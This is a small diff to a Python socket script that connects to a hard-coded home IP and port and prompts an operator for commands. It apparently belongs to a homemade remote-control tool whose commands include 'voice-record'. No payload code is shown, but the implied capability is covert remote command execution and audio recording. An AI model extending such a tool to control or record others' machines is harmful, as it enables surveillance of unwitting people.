@@ -2,7 +2,7 @@ import socket
 import os
 import time
 s = socket.socket()
-SERVER_HOST = "192.168.1.7"
+SERVER_HOST = "192.168.1.7"# you home ip
 SERVER_PORT = 5003
 BUFFER_SIZE = 1024
 
@@ -11,7 +11,9 @@ s = socket.socket()
 # connect to the server
 s.connect((SERVER_HOST, SERVER_PORT))
 print(f"Connected to {SERVER_HOST}:{SERVER_PORT}\nCommand: ")
-print("Severe request to please type dir 2 times after any complex command")
+print("Severe request to please type any cmd command like cd or dir 2 times after any complex command")
+print("For example if you type voice-record.....press cd 2 times after the command gets complete.otherwise there will be a hang.")
+print("i know a bit irritating but we'll improve it in future.........")
 message = input('=>')
 	
 while message != 'quit':
